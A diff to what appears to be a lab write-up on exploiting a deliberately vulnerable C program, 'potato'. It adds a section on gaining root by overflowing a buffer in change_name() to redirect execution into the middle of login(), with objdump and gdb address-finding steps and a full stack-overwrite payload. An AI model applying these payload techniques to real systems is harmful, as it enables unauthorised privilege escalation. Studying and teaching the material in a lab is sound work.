@@ -284,7 +284,7 @@ payload=b"\x41"*58 + b"\x38\xce\xff\xff" + p32(0x0804b108)
 # ...
 ```
 
-## change the execution flow to get authenticated for a privileged user
+## become privileged user without changing execution path (not requested)
 
 It is possible to get privileged user credentialy without overwriting the stack return address. If we
 overwrite the global user data structure such that we obtain a user id of zero, we get the credentials
@@ -312,6 +312,118 @@ p.sendline(payload)
 p.interactive()
 # At this point, we can use potato interactively again, but our user id is zero, 
 # i.e. we are a "privileged user" and are allowed, e.g. to delete other users.
+```
+
+## change the execution flow to get authenticated for a privileged user
+
+There is only one privileged user listed, which is `root`. In order to become root, the `login()` function
+must be executed:
+
+```c
+void
+login()
+{
+    char input_username[USERNAME_LENGTH];
+    //char* input_password;
+    char input_password[PASSWORD_LENGTH];
+    t_user* user;
+
+    fputs("Welcome!\n", stdout);
+    fputs("username: ", stdout); fflush(stdout);
+    fgets(input_username, USERNAME_LENGTH, stdin);
+    input_username[strcspn(input_username, "\n")] = 0x00;
+    // if terminal
+    //input_password = getpass("Password: "); fflush(stdout);
+    fputs("password: ", stdout); fflush(stdout);
+    fgets(input_password, PASSWORD_LENGTH, stdin);
+    input_password[strcspn(input_password, "\n")] = 0x00;
+
+    printf("searching for user ...\n");
+    if((user = get_user_by_name(input_username)) == NULL)
+    {
+        fprintf(stdout, "no such user\n");
+        return;
+    }
+
+    printf("checking password ...\n");
+    if(check_password(user, input_password) == 1)
+    {
+        fprintf(stdout, "You are authorized.\n");
+        session.logged_in_user = user;
+        session.start_time = time(0);
+        chdir(user->home);
+    }
+    else
+    {
+    	fprintf(stderr, "Authentication failure\n");
+    }
+}
+```
+
+However, there first part of the function, which does the authentication must be skipped since the password is
+unknown. The function must be called starting with the `session.logged_in_user = user;` statement. The address
+of that statement can be found, e.g. like this
+
+```bash
+$ objdump -Sd potato | grep -C5 -w "session.logged_in_user = user;"
+ 804af13:       6a 01                   push   $0x1
+ 804af15:       8d 83 bd e6 ff ff       lea    -0x1943(%ebx),%eax
+ 804af1b:       50                      push   %eax
+ 804af1c:       e8 cf e1 ff ff          call   80490f0 <fwrite@plt>
+ 804af21:       83 c4 10                add    $0x10,%esp
+        session.logged_in_user = user;
+ 804af24:       8b 45 f4                mov    -0xc(%ebp),%eax
+ 804af27:       89 83 1c 01 00 00       mov    %eax,0x11c(%ebx)
+        session.start_time = time(0);
+ 804af2d:       83 ec 0c                sub    $0xc,%esp
+ 804af30:       6a 00 
+```
+
+The address is `0x804af24`. The first assembly statement writes the content of `(%ebp - 0xc)` into `%eax`. After
+that statement, `%eax` holds the right hand side of the assignment statement. The address of the desired `root`
+user can be found out by putting a breakpoint after `init()` was called, then by issuing `p user_list->head->user`,
+which yieds `0x8050370`. That value must be copied onto `(%ebp - 0xc)`.
+
+The left hand side of the assignment is `%ebx + 0x11c`. To find out the content of `%ebx`, set a breakpoint at 
+the assignment statement, run `potato` normally and print the register content: `p $ebx`, which yields `0x804dff4`.
+
+The next code sequence to examine is the epilogue of `change_name()`
+```bash
+$ objdump -Sd potato | grep -A15 -w "Name changed"
+    fprintf(stdout, "Name changed.\n");
+...
+ 804b046:       90                      nop
+ 804b047:       8b 5d fc                mov    -0x4(%ebp),%ebx
+ 804b04a:       c9                      leave
+ 804b04b:       c3                      ret
+
+```
+
+In `0x804b047`, `%ebx` is assigned the content of `%ebp -0x4`, i.e. four bytes before the `%ebp`, the desired value
+`0x804dff4` must be written, i.e. the offset w.r.t the overflown buffer is 54. In the next step, the content of
+the four byte entities at offset 50 and at offset 58 (base pointer) are retrieved by running `change_name()` without
+buffer overflow, which gives the values `0xffffccf1` and `0xffffcdf8`. The last step is done by overwriting the
+address `handle_client()` returns from in order to prevent the application from terminating. That return address
+is overwritten by the address of `handle_client()` itself. The resulting payload is then:
+
+```python
+# ...
+root_user=0x8050370                 # gotten via p user_list->head->user
+base_ptr=0xffffcdf8                 # base pointer of change_name (i.e. stack frame address)
+login_setuser=0x804af24             # part of login() function setting the currently logged in user: func.c, line 163
+global_ptr=0x804dff4                # global pointer from which session->logged_in_user is changed in login()/content of $ebx
+restart_handle_client=0x0804965a    # overwritten return address of after handle_client() finishes
+
+payload=b"\x41"*50              # input_name \
+ + p32(0xffffccf1)              # local var \
+ + p32(global_ptr)              # content of %ebx \
+ + p32(base_ptr)                # recorded base pointer of change_name()
+ + p32(login_setuser)           # second part of login() that sets the current user \
+ + b"\x41"*252                  # stack frame of handle_client() \
+ + p32(root_user)               # address of the root user \
+ + b"\x41"*12                   # rest of stack frame of handle_client() \
+ + p32(restart_handle_client)   # return address from handle_client() call, overwritten by the address of handle_client()
+# ...
 ```
 
 ## execute shellcode
